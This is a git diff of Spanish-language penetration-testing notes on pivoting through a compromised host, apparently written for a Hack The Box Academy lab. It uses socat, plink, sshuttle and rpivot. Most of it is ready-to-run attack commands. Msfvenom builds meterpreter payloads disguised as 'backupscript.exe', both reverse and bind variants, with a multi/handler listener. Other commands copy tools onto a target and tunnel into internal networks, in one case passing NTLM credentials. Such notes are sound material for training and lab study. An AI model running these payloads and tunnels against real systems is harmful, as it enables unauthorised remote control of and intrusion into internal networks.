@@ -45,10 +45,45 @@ for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 	###	SOCAT
 Socat permite entablar conexiones entre dos host distintos de redes distintas sin conexions SSH funcionando como porxy que recibe en un puerto y manda a cierto host y puerto.
 
-socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
-#De esta forma (en nuestro host pivote) configuramos para que escuche local en el 8080 y lo envie a nuestro host de ataque puerto 80
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+socat TCP4-LISTEN:8080,fork TCP4:<ip_target>:8443
+#De esta forma (en nuestro host pivote) configuramos para que escuche local en el 8080 y lo envie al host objetivo en el puerto X
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
 #Nuevamente configuramos un payload que debe se enviado al target windows apuntando al host pivote (donde esta el socat) con el respectivo puerto de escucha
-#Configuradno un listener y ejecutando el payload obtenemos la conexion
+use exploit/multi/handler
+#Configuramos un listener mediante meterpreter que apunte al host donde esta socat con el respectivo puerto de escucha (en este caaso puerto 8080) y el payload (set payload windows/x64/meterpreter/bind_tcp)
+
+	###	PUTTY y PLINK
+Es importante saber como hacer lo anterior en windows puesto si el host pivote al que accedemos contiene este SO vamos a tener que pivotear desde aca.
+Plink es una herramienta de linea de comandos que viene con PuTTY. En los host windows mas recientes no se encuentra PuTTY (por lo gral) puesto que windows ya posee su propio "ssh".
+De todas formas PuTTY es muy usado actualmente por los administradores de sistemas.
+
+plink -D 9050 ubuntu@10.129.15.50
+#Iniciamos una sesion ssh con el host ubuntu y comienza a escuchar en el 9050.
+
+	###	SSHUTTLE
+Nos permite pivotar sin proxychains mediante SSH.
+
+sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
+#Especificamos usuario, IP y la red o ip a la que queremos enrutar mediante nuestro host pivot
+#Una vez hecho esto podemos usar cualquier herramienta sin configurar proxychains (https://academy.hackthebox.com/module/158/section/1432)
+
+	###	RPIVOT (WEB server pivoting)
+sudo git clone https://github.com/klsecservices/rpivot.git
+sudo apt-get install python2.7
+
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+#Con el comando de arriba especificamos que el cliente se conecte al puerto 9999 y escuche en el 9050
+
+scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
+#De esta forma se puede copiar rpivot al objetivo mediante ssh
+python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+#Ejecutamos el cliente en el servidor pivot
+
+proxychains firefox-esr 172.16.5.135:80
+#De esta forma con proxychains configuramos para poder acceder al servidor web. (La ip es la ip del webserver: https://academy.hackthebox.com/module/158/section/1434)
+
+python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
+#Muchas veces para acceder a una pagina se necesita una autenticacion NTLM. Para ello podemos usar un usr y psw de la siguiente forma
+
 
 
